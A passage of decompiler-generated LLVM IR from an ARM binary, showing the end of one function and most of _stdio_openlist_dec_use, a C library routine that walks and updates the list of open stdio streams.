  store i32 %v6_1659c, i32* @r5, align 4
  store i32 %v9_1659c, i32* @r6, align 4
  store i32 %v12_1659c, i32* @r7, align 4
  store i32 %v15_1659c, i32* @r8, align 4
  store i32 %v24_1659c, i32* @lr, align 4
  ret i32 %v0_166ac

; uselistorder directives
  uselistorder i32 %v0_16680, { 1, 0, 2 }
  uselistorder i32 %v1_16664.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16620, { 1, 0 }
  uselistorder i32 %v0_16624, { 1, 0 }
  uselistorder i32 %v1_165e0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 12, 5, 6, 7, 8, 10, 9, 0, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_166ac, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16684, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1666c, { 1, 0 }
  uselistorder label %dec_label_pc_1661c, { 1, 0 }
  uselistorder label %dec_label_pc_16610, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16600, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165e8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_166b8 = load i32, i32* @r4, align 4
  store i32 %v3_166b8, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r5.global-to-local, align 4
  %v4_166c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 160) to i32*), align 4
  store i32 %v4_166c8, i32* %r7.global-to-local, align 4
  %v0_166cc = call i32 @__aeabi_read_tp()
  store i32 %v0_166cc, i32* %r0.global-to-local, align 4
  %v1_166d0 = add i32 %v4_166c8, 8
  %v2_166d0 = inttoptr i32 %v1_166d0 to i32*
  %v3_166d0 = load i32, i32* %v2_166d0, align 4
  store i32 %v3_166d0, i32* %r3.global-to-local, align 4
  %v1_166d4 = add i32 %v0_166cc, -1168
  store i32 %v1_166d4, i32* %r6.global-to-local, align 4
  %v3_166d8 = icmp uge i32 %v3_166d0, %v1_166d4
  store i1 %v3_166d8, i1* %cpsr_c.global-to-local, align 1
  %v9_166d8 = icmp eq i32 %v3_166d0, %v1_166d4
  br i1 %v9_166d8, label %dec_label_pc_16724, label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_166c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_166f093 = inttoptr i32 %v4_166c8 to i32*
  %v2_166f094 = load i32, i32* %v1_166f093, align 4
  store i32 %v2_166f094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_166f496 = icmp eq i32 %v2_166f094, 0
  br i1 %v9_166f496, label %dec_label_pc_166fc, label %dec_label_pc_16714

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166e4, %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge
  %v0_166fc97 = phi i32 [ %v1_166f4.pre, %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge ], [ 0, %dec_label_pc_166e4 ]
  store i32 %v0_166fc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1670c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1670c, label %dec_label_pc_16710, label %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge

dec_label_pc_166fc.dec_label_pc_166f0_crit_edge:  ; preds = %dec_label_pc_166fc
  %v0_166f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_166f0 = inttoptr i32 %v0_166f0.pre to i32*
  %v2_166f0 = load i32, i32* %v1_166f0, align 4
  store i32 %v2_166f0, i32* %r3.global-to-local, align 4
  %v3_166f4 = icmp uge i32 %v2_166f0, %v1_166f4.pre
  store i1 %v3_166f4, i1* %cpsr_c.global-to-local, align 1
  %v9_166f4 = icmp eq i32 %v2_166f0, %v1_166f4.pre
  br i1 %v9_166f4, label %dec_label_pc_166fc, label %dec_label_pc_16714

dec_label_pc_16710:                               ; preds = %dec_label_pc_166fc
  %v0_16710 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16710, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16714

dec_label_pc_16714:                               ; preds = %dec_label_pc_166e4, %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge, %dec_label_pc_16710
  %v0_16714 = phi i32 [ %v0_16710, %dec_label_pc_16710 ], [ %v2_166f094, %dec_label_pc_166e4 ], [ %v2_166f0, %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge ]
  %v1_16714 = phi i32 [ %v0_16710, %dec_label_pc_16710 ], [ 0, %dec_label_pc_166e4 ], [ %v1_166f4.pre, %dec_label_pc_166fc.dec_label_pc_166f0_crit_edge ]
  %v3_16714 = icmp uge i32 %v0_16714, %v1_16714
  store i1 %v3_16714, i1* %cpsr_c.global-to-local, align 1
  %v9_16714 = icmp eq i32 %v0_16714, %v1_16714
  br i1 %v9_16714, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16714
  %v1_16718 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16718, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16714, %bb
  %v1_1671c = xor i1 %v9_16714, true
  call void @__pseudo_cond_branch(i1 %v1_1671c, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_16720 = load i32, i32* %r6.global-to-local, align 4
  %v1_16720 = load i32, i32* %r7.global-to-local, align 4
  %v2_16720 = add i32 %v1_16720, 8
  %v3_16720 = inttoptr i32 %v2_16720 to i32*
  store i32 %v0_16720, i32* %v3_16720, align 4
  br label %dec_label_pc_16724

dec_label_pc_16724:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16728 = load i32, i32* %r5.global-to-local, align 4
  %v2_16728 = add i32 %v0_16728, 160
  %v3_16728 = inttoptr i32 %v2_16728 to i32*
  %v4_16728 = load i32, i32* %v3_16728, align 4
  store i32 %v4_16728, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16730 = add i32 %v0_16728, 12
  %v3_16730 = inttoptr i32 %v2_16730 to i32*
  %v4_16730 = load i32, i32* %v3_16730, align 4
  store i32 %v4_16730, i32* %r3.global-to-local, align 4
  %v1_16734 = inttoptr i32 %v4_16730 to i32*
  %v2_16734 = load i32, i32* %v1_16734, align 4
  store i32 %v2_16734, i32* %r1.global-to-local, align 4
  %v1_16738 = add i32 %v4_16728, 4
  %v2_16738 = inttoptr i32 %v1_16738 to i32*
  %v3_16738 = load i32, i32* %v2_16738, align 4
  %v2_1673c = icmp ne i32 %v2_16734, 0
  store i1 %v2_1673c, i1* %cpsr_c.global-to-local, align 1
  %v7_1673c = icmp eq i32 %v2_16734, 1
  %v1_16740 = add i32 %v3_16738, 1
  store i32 %v1_16740, i32* %r3.global-to-local, align 4
  store i32 %v1_16740, i32* %v2_16738, align 4
  br i1 %v7_1673c, label %dec_label_pc_1674c, label %dec_label_pc_168b0

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16724
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16750 = load i32, i32* %r5.global-to-local, align 4
  %v2_16750 = add i32 %v0_16750, 80
  %v3_16750 = inttoptr i32 %v2_16750 to i32*
  %v4_16750 = load i32, i32* %v3_16750, align 4
  store i32 %v4_16750, i32* %r3.global-to-local, align 4
  %v1_16754 = inttoptr i32 %v4_16750 to i32*
  %v2_16754 = load i32, i32* %v1_16754, align 4
  store i32 %v2_16754, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16754, 1
  br i1 %tmp46, label %dec_label_pc_168b0, label %dec_label_pc_16760

dec_label_pc_16760:                               ; preds = %dec_label_pc_1674c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16764 = add i32 %v0_16750, 152
  %v3_16764 = inttoptr i32 %v2_16764 to i32*
  %v4_16764 = load i32, i32* %v3_16764, align 4
  store i32 %v4_16764, i32* %r7.global-to-local, align 4
  %v1_16768 = add i32 %v4_16764, 8
  %v2_16768 = inttoptr i32 %v1_16768 to i32*
  %v3_16768 = load i32, i32* %v2_16768, align 4
  store i32 %v3_16768, i32* %r3.global-to-local, align 4
  %v1_1676c = load i32, i32* %r6.global-to-local, align 4
  %v3_1676c = icmp uge i32 %v3_16768, %v1_1676c
  store i1 %v3_1676c, i1* %cpsr_c.global-to-local, align 1
  %v9_1676c = icmp eq i32 %v3_16768, %v1_1676c
  br i1 %v9_1676c, label %dec_label_pc_167b0, label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_16760
  store i32 %v4_16764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1677c86 = inttoptr i32 %v4_16764 to i32*
  %v2_1677c87 = load i32, i32* %v1_1677c86, align 4
  store i32 %v2_1677c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1678089 = icmp eq i32 %v2_1677c87, 0
  br i1 %v9_1678089, label %dec_label_pc_16788, label %dec_label_pc_167a0

dec_label_pc_16788:                               ; preds = %dec_label_pc_16774, %dec_label_pc_16788.dec_label_pc_1677c_crit_edge
  %v0_1678890 = phi i32 [ %v1_16780.pre, %dec_label_pc_16788.dec_label_pc_1677c_crit_edge ], [ 0, %dec_label_pc_16774 ]
  store i32 %v0_1678890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16798 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16798, label %dec_label_pc_1679c, label %dec_label_pc_16788.dec_label_pc_1677c_crit_edge

dec_label_pc_16788.dec_label_pc_1677c_crit_edge:  ; preds = %dec_label_pc_16788
  %v0_1677c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16780.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1677c = inttoptr i32 %v0_1677c.pre to i32*
  %v2_1677c = load i32, i32* %v1_1677c, align 4
  store i32 %v2_1677c, i32* %r3.global-to-local, align 4
  %v3_16780 = icmp uge i32 %v2_1677c, %v1_16780.pre
  store i1 %v3_16780, i1* %cpsr_c.global-to-local, align 1
  %v9_16780 = icmp eq i32 %v2_1677c, %v1_16780.pre
  br i1 %v9_16780, label %dec_label_pc_16788, label %dec_label_pc_167a0

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16788
  %v0_1679c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1679c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %dec_label_pc_16774, %dec_label_pc_16788.dec_label_pc_1677c_crit_edge, %dec_label_pc_1679c
  %v0_167a0 = phi i32 [ %v0_1679c, %dec_label_pc_1679c ], [ %v2_1677c87, %dec_label_pc_16774 ], [ %v2_1677c, %dec_label_pc_16788.dec_label_pc_1677c_crit_edge ]
  %v1_167a0 = phi i32 [ %v0_1679c, %dec_label_pc_1679c ], [ 0, %dec_label_pc_16774 ], [ %v1_16780.pre, %dec_label_pc_16788.dec_label_pc_1677c_crit_edge ]
  %v3_167a0 = icmp uge i32 %v0_167a0, %v1_167a0
  store i1 %v3_167a0, i1* %cpsr_c.global-to-local, align 1
  %v9_167a0 = icmp eq i32 %v0_167a0, %v1_167a0
  br i1 %v9_167a0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_167a0
  %v1_167a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_167a4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_167a0, %bb47
  %v1_167a8 = xor i1 %v9_167a0, true
  call void @__pseudo_cond_branch(i1 %v1_167a8, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_167ac = load i32, i32* %r6.global-to-local, align 4
  %v1_167ac = load i32, i32* %r7.global-to-local, align 4
  %v2_167ac = add i32 %v1_167ac, 8
  %v3_167ac = inttoptr i32 %v2_167ac to i32*
  store i32 %v0_167ac, i32* %v3_167ac, align 4
  %v0_167b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %dec_label_pc_16760, %bb48
  %v0_167b8 = phi i32 [ %v0_16750, %dec_label_pc_16760 ], [ %v0_167b8.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_167b8 = add i32 %v0_167b8, 152
  %v3_167b8 = inttoptr i32 %v2_167b8 to i32*
  %v4_167b8 = load i32, i32* %v3_167b8, align 4
  store i32 %v4_167b8, i32* %r0.global-to-local, align 4
  %v2_167bc = add i32 %v0_167b8, 76
  %v3_167bc = inttoptr i32 %v2_167bc to i32*
  %v4_167bc = load i32, i32* %v3_167bc, align 4
  store i32 %v4_167bc, i32* %r2.global-to-local, align 4
  %v1_167c0 = add i32 %v4_167b8, 4
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  store i32 %v3_167c0, i32* %r3.global-to-local, align 4
  %v1_167c4 = inttoptr i32 %v4_167bc to i32*
  %v2_167c4 = load i32, i32* %v1_167c4, align 4
  store i32 %v2_167c4, i32* %r2.global-to-local, align 4
  %v1_167c8 = add i32 %v3_167c0, 1
  store i32 %v1_167c8, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_167c8, i32* %v2_167c0, align 4
  %v0_16818.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1681811 = icmp eq i32 %v0_16818.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1681811, label %dec_label_pc_16824, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167b0, %dec_label_pc_16814
  %v0_168002 = phi i32 [ %v0_16814, %dec_label_pc_16814 ], [ %v0_16818.pr, %dec_label_pc_167b0 ]
  %v1_167dc = inttoptr i32 %v0_168002 to i16*
  %v2_167dc = load i16, i16* %v1_167dc, align 2
  %v3_167dc = zext i16 %v2_167dc to i32
  store i32 %v3_167dc, i32* %r3.global-to-local, align 4
  %v2_167e0 = and i32 %v3_167dc, 32816
  store i32 %v2_167e0, i32* %r1.global-to-local, align 4
  %v2_167e4 = icmp ugt i32 %v2_167e0, 47
  store i1 %v2_167e4, i1* %cpsr_c.global-to-local, align 1
  %v7_167e4 = icmp eq i32 %v2_167e0, 48
  %v1_167e8 = add i32 %v0_168002, 32
  %v2_167e8 = inttoptr i32 %v1_167e8 to i32*
  %v3_167e8 = load i32, i32* %v2_167e8, align 4
  store i32 %v3_167e8, i32* %r4.global-to-local, align 4
  br i1 %v7_167e4, label %dec_label_pc_167f4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_167dc
  store i32 %v0_168002, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16814

dec_label_pc_167f4:                               ; preds = %dec_label_pc_167dc
  %v0_167f4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_167f4 = icmp eq i32 %v0_167f4, 0
  br i1 %v2_167f4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_167f4
  %v1_167f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_167f8 = load i32, i32* %r7.global-to-local, align 4
  %v3_167f8 = add i32 %v2_167f8, %v1_167f8
  %v4_167f8 = inttoptr i32 %v3_167f8 to i32*
  %v5_167f8 = load i32, i32* %v4_167f8, align 4
  store i32 %v5_167f8, i32* %r3.global-to-local, align 4
  %v3_167fc = inttoptr i32 %v5_167f8 to i32*
  store i32 %v3_167e8, i32* %v3_167fc, align 4
  %v0_16800 = load i32, i32* %r2.global-to-local, align 4
  %v1_16800 = inttoptr i32 %v0_16800 to i16*
  %v2_16800 = load i16, i16* %v1_16800, align 2
  %v3_16800 = zext i16 %v2_16800 to i32
  store i32 %v3_16800, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_167f4
  %v2_168008 = load i16, i16* %v1_167dc, align 2
  %v3_168009 = zext i16 %v2_168008 to i32
  store i32 %v3_168009, i32* %r3.global-to-local, align 4
  %v3_16804 = add i32 %v0_167f4, 32
  %v4_16804 = inttoptr i32 %v3_16804 to i32*
  store i32 %v3_167e8, i32* %v4_16804, align 4
  %v0_16808.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16808 = phi i32 [ %v3_16800, %.thread ], [ %v0_16808.pre, %bb49 ]
  %v1_16808 = and i32 %v0_16808, 8192
  %v2_16808 = icmp eq i32 %v1_16808, 0
  br i1 %v2_16808, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1680c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1680c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16810 = xor i1 %v2_16808, true
  call void @__pseudo_cond_branch(i1 %v1_16810, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_16814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %.thread38, %bb52
  %v0_16814 = phi i32 [ %v0_16814.pre, %bb52 ], [ %v3_167e8, %.thread38 ]
  store i32 %v0_16814, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16818 = icmp eq i32 %v0_16814, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16818, label %dec_label_pc_16824, label %dec_label_pc_167dc

dec_label_pc_16824:                               ; preds = %dec_label_pc_16814, %dec_label_pc_167b0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16828 = load i32, i32* %r5.global-to-local, align 4
  %v2_16828 = add i32 %v0_16828, 152
  %v3_16828 = inttoptr i32 %v2_16828 to i32*
  %v4_16828 = load i32, i32* %v3_16828, align 4
  store i32 %v4_16828, i32* %r0.global-to-local, align 4
  %v1_1682c = add i32 %v4_16828, 4
  %v2_1682c = inttoptr i32 %v1_1682c to i32*
  %v3_1682c = load i32, i32* %v2_1682c, align 4
  %v1_16830 = add i32 %v3_1682c, -1
  store i32 %v1_16830, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16834 = icmp eq i32 %v1_16830, 0
  store i32 %v1_16830, i32* %v2_1682c, align 4
  br i1 %v2_16834, label %dec_label_pc_16840, label %dec_label_pc_168a0

dec_label_pc_16840:                               ; preds = %dec_label_pc_16824
  %v0_16840 = load i32, i32* %r3.global-to-local, align 4
  %v1_16840 = load i32, i32* %r0.global-to-local, align 4
  %v2_16840 = add i32 %v1_16840, 8
  %v3_16840 = inttoptr i32 %v2_16840 to i32*
  store i32 %v0_16840, i32* %v3_16840, align 4
  %v0_16844 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16844, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_16878.dec_label_pc_16848_crit_edge, %dec_label_pc_16840
  %v0_16848 = phi i32 [ %v0_16848.pre, %dec_label_pc_16878.dec_label_pc_16848_crit_edge ], [ %v0_16844, %dec_label_pc_16840 ]
  %v1_16848 = inttoptr i32 %v0_16848 to i32*
  %v2_16848 = load i32, i32* %v1_16848, align 4
  store i32 %v2_16848, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16848, i32* %r2.global-to-local, align 4
  %v2_1685474 = load i32, i32* %v1_16848, align 4
  store i32 %v2_1685474, i32* %r3.global-to-local, align 4
  %v3_1685876 = icmp uge i32 %v2_1685474, %v2_16848
  store i1 %v3_1685876, i1* %cpsr_c.global-to-local, align 1
  %v9_1685882 = icmp eq i32 %v2_1685474, %v2_16848
  br i1 %v9_1685882, label %dec_label_pc_16860, label %dec_label_pc_16878

dec_label_pc_16860:                               ; preds = %dec_label_pc_16848, %dec_label_pc_16860.dec_label_pc_16854_crit_edge
  %v0_1686083 = phi i32 [ %v1_16858.pre, %dec_label_pc_16860.dec_label_pc_16854_crit_edge ], [ %v2_16848, %dec_label_pc_16848 ]
  store i32 %v0_1686083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16870 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16870, label %dec_label_pc_16874, label %dec_label_pc_16860.dec_label_pc_16854_crit_edge

dec_label_pc_16860.dec_label_pc_16854_crit_edge:  ; preds = %dec_label_pc_16860
  %v0_16854.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16858.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16854 = inttoptr i32 %v0_16854.pre to i32*
  %v2_16854 = load i32, i32* %v1_16854, align 4
  store i32 %v2_16854, i32* %r3.global-to-local, align 4
  %v3_16858 = icmp uge i32 %v2_16854, %v1_16858.pre
  store i1 %v3_16858, i1* %cpsr_c.global-to-local, align 1
  %v9_16858 = icmp eq i32 %v2_16854, %v1_16858.pre
  br i1 %v9_16858, label %dec_label_pc_16860, label %dec_label_pc_16878

dec_label_pc_16874:                               ; preds = %dec_label_pc_16860
  %v0_16874 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16874, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16878

dec_label_pc_16878:                               ; preds = %dec_label_pc_16848, %dec_label_pc_16860.dec_label_pc_16854_crit_edge, %dec_label_pc_16874
  %v0_16880 = phi i32 [ %v0_16874, %dec_label_pc_16874 ], [ %v2_1685474, %dec_label_pc_16848 ], [ %v2_16854, %dec_label_pc_16860.dec_label_pc_16854_crit_edge ]
  %v1_16878 = phi i32 [ %v0_16874, %dec_label_pc_16874 ], [ %v2_16848, %dec_label_pc_16848 ], [ %v1_16858.pre, %dec_label_pc_16860.dec_label_pc_16854_crit_edge ]
  %v3_16878 = icmp uge i32 %v0_16880, %v1_16878
  store i1 %v3_16878, i1* %cpsr_c.global-to-local, align 1
  %v9_16878 = icmp eq i32 %v0_16880, %v1_16878
  br i1 %v9_16878, label %dec_label_pc_16880, label %dec_label_pc_16878.dec_label_pc_16848_crit_edge

dec_label_pc_16878.dec_label_pc_16848_crit_edge:  ; preds = %dec_label_pc_16878
  %v0_16848.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16848

dec_label_pc_16880:                               ; preds = %dec_label_pc_16878
  %v2_16880 = icmp ne i32 %v1_16878, 0
  store i1 %v2_16880, i1* %cpsr_c.global-to-local, align 1
  %v7_16884 = icmp slt i32 %v1_16878, 2
  br i1 %v7_16884, label %dec_label_pc_168a0, label %dec_label_pc_16888

dec_label_pc_16888:                               ; preds = %dec_label_pc_16880
  %v0_16888 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16888, i32* %r0.global-to-local, align 4
  %v0_1688c = load i32, i32* %r1.global-to-local, align 4
  %v1_1688c = add i32 %v0_1688c, 129
  store i32 %v1_1688c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16824, %dec_label_pc_16888, %dec_label_pc_16880
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_168a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_168a4 = add i32 %v0_168a4, 80
  %v3_168a4 = inttoptr i32 %v2_168a4 to i32*
  %v4_168a4 = load i32, i32* %v3_168a4, align 4
  store i32 %v4_168a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_168ac = inttoptr i32 %v4_168a4 to i32*
  store i32 0, i32* %v2_168ac, align 4
  br label %dec_label_pc_168b0

dec_label_pc_168b0:                               ; preds = %dec_label_pc_16724, %dec_label_pc_1674c, %dec_label_pc_168a0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_168b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_168b4 = add i32 %v0_168b4, 160
  %v3_168b4 = inttoptr i32 %v2_168b4 to i32*
  %v4_168b4 = load i32, i32* %v3_168b4, align 4
  store i32 %v4_168b4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_168bc = add i32 %v0_168b4, 12
  %v3_168bc = inttoptr i32 %v2_168bc to i32*
  %v4_168bc = load i32, i32* %v3_168bc, align 4
  store i32 %v4_168bc, i32* %r1.global-to-local, align 4
  %v1_168c0 = add i32 %v4_168b4, 4
  %v2_168c0 = inttoptr i32 %v1_168c0 to i32*
  %v3_168c0 = load i32, i32* %v2_168c0, align 4
  store i32 %v3_168c0, i32* %r2.global-to-local, align 4
  %v1_168c4 = inttoptr i32 %v4_168bc to i32*
  %v2_168c4 = load i32, i32* %v1_168c4, align 4
  %v1_168c8 = add i32 %v3_168c0, -1
  store i32 %v1_168c8, i32* %r2.global-to-local, align 4
  %v1_168cc = add i32 %v2_168c4, -1
  store i32 %v1_168cc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168d0 = icmp eq i32 %v1_168c8, 0
  store i32 %v1_168cc, i32* %v1_168c4, align 4
  %v0_168d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_168d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_168d8 = add i32 %v1_168d8, 4
  %v3_168d8 = inttoptr i32 %v2_168d8 to i32*
  store i32 %v0_168d8, i32* %v3_168d8, align 4
  br i1 %v2_168d0, label %dec_label_pc_168e0, label %dec_label_pc_16940

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168b0
  %v0_168e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_168e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_168e0 = add i32 %v1_168e0, 8
  %v3_168e0 = inttoptr i32 %v2_168e0 to i32*
  store i32 %v0_168e0, i32* %v3_168e0, align 4
  %v0_168e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_168e4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_16918.dec_label_pc_168e8_crit_edge, %dec_label_pc_168e0
  %v0_168e8 = phi i32 [ %v0_168e8.pre, %dec_label_pc_16918.dec_label_pc_168e8_crit_edge ], [ %v0_168e4, %dec_label_pc_168e0 ]
  %v1_168e8 = inttoptr i32 %v0_168e8 to i32*
  %v2_168e8 = load i32, i32* %v1_168e8, align 4
  store i32 %v2_168e8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_168e8, i32* %r2.global-to-local, align 4
  %v2_168f462 = load i32, i32* %v1_168e8, align 4
  store i32 %v2_168f462, i32* %r3.global-to-local, align 4
  %v3_168f864 = icmp uge i32 %v2_168f462, %v2_168e8
  store i1 %v3_168f864, i1* %cpsr_c.global-to-local, align 1
  %v9_168f870 = icmp eq i32 %v2_168f462, %v2_168e8
  br i1 %v9_168f870, label %dec_label_pc_16900, label %dec_label_pc_16918

dec_label_pc_16900:                               ; preds = %dec_label_pc_168e8, %dec_label_pc_16900.dec_label_pc_168f4_crit_edge
  %v0_1690071 = phi i32 [ %v1_168f8.pre, %dec_label_pc_16900.dec_label_pc_168f4_crit_edge ], [ %v2_168e8, %dec_label_pc_168e8 ]
  store i32 %v0_1690071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16910 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16910, label %dec_label_pc_16914, label %dec_label_pc_16900.dec_label_pc_168f4_crit_edge

dec_label_pc_16900.dec_label_pc_168f4_crit_edge:  ; preds = %dec_label_pc_16900
  %v0_168f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_168f8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_168f4 = inttoptr i32 %v0_168f4.pre to i32*
  %v2_168f4 = load i32, i32* %v1_168f4, align 4
  store i32 %v2_168f4, i32* %r3.global-to-local, align 4
  %v3_168f8 = icmp uge i32 %v2_168f4, %v1_168f8.pre
